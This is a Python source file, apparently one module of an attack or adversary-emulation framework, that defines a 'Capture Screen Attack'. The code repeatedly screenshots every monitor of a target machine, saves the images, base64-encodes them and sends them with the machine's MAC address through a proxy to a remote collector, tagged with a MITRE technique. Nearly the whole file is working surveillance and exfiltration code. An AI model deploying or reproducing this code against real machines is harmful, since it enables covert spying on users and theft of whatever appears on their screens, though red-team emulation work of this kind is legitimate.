from .attack import Attack, MitreAttack, istanbul_tz
from modules.proxy.proxy import Proxy
from PIL import ImageGrab, Image
import screeninfo
from time import sleep
from tools import (
    _path_joiner,
    create_new_dir,
    check_folder_exits,
    get_current_time
)
from rich import print
import base64, io
from datetime import datetime
from .sys_info import SystemInfo

class CaptureScreen(Attack):
    def __init__(self,
                 proxy: Proxy,
                 file_path: str, 
                 period: int = 20,
                 grap_num: int = 1,
                 full_screen: bool = False):
        """Capture the screen of the target machine.

        Args:
            period (int, optional): Period of screen capture. Defaults to 20.
            grap_num (int, optional): Number of screen captures. Defaults to 1.
            file_path (str): Path to save the screen captures.
            full_screen (bool, optional): Capture the full screen or sperate screens. Defaults to False.
        """
        super().__init__(proxy=proxy, name="Capture Screen Attack", 
                         description=f"This attack captures the screen of the target machine every {period} seconds for {grap_num} times.")
        self.period = period
        self.grap_num = grap_num
        self.file_path = file_path
        self.full_screen = full_screen
        
        self._prepare() # prepare the file path for saving the screen captures


    def execute(self):
        self.running = True
        while self.running:
            for _ in range(self.grap_num):
                self.grap_screen(full_screen=self.full_screen)
            sleep(self.period)
    
    def grap_screen(self, full_screen: bool = True):
        
        if full_screen:
            self._grap_full_screen()
            return
        
        self._grap_monitors()
    
       
    def _grap_full_screen(self):
        try:
            im = ImageGrab.grab()
            self._send_result(image=im, success=True)
            self._save_image(im, "full_screen")
        except Exception as e:
            self._send_result(success=False)
            print(f"[Grap Screen] Error: {e}")
    
    def _grap_monitors(self):
        for screen in screeninfo.get_monitors():
                try:
                    im = ImageGrab.grab(bbox=(screen.x, 
                                          screen.y, 
                                          screen.width + screen.x, 
                                          screen.height + screen.y))
                    self._send_result(image=im, success=True)
                    self._save_image(im, screen.name)
                except Exception as e:
                    self._send_result(success=False)
                    print(f"[Grap Screen] Error: {e}")
    

    def _save_image(self, image: Image, file_name: str, format: str="png"):
        now = get_current_time(string=True)
        file_path = _path_joiner(self.file_path, f"{now}_{file_name}.{format}")

        try:
            image.save(file_path)
            print(f"[cyan]Screen capture saved: {file_name}.{format}[/cyan]")
        except Exception as e:
            print(f"[Save Image] Error: {e}")

    def _prepare(self):
        if not check_folder_exits(self.file_path):
            create_new_dir(self.file_path)
    
    def _read_image_binary(self, path: str):
        try: 
            with open(path, "rb") as f:
                content =  f.read()
                return content
        except Exception as e:
            print(f"[read image binary] Error: {e}")
            
    def _convert_base64(self, image: Image):
        try:
            buffer = io.BytesIO()
            image.save(buffer, format='PNG')
            return base64.b64encode(buffer.getvalue()).decode('utf-8')
        except Exception as e:
             print(f"[convert base64] Error: {e}")

    def _send_result(self, success:bool, image: Image = None):
        
        data = {}
        if image:
            data["image_binary"] = self._convert_base64(image)
            
        
        result = {
            "result_type": "screen_capture",
            "success": success,
            "executed_date": datetime.now(istanbul_tz),
            "machine": SystemInfo._get_mac_addr(),
            "attack": MitreAttack.SCREEN_CAPTURE.value,
            "data":  data
        }
        
        result_data = self.proxy._generate_result_data(**result)
        self.proxy.send_result(result_data)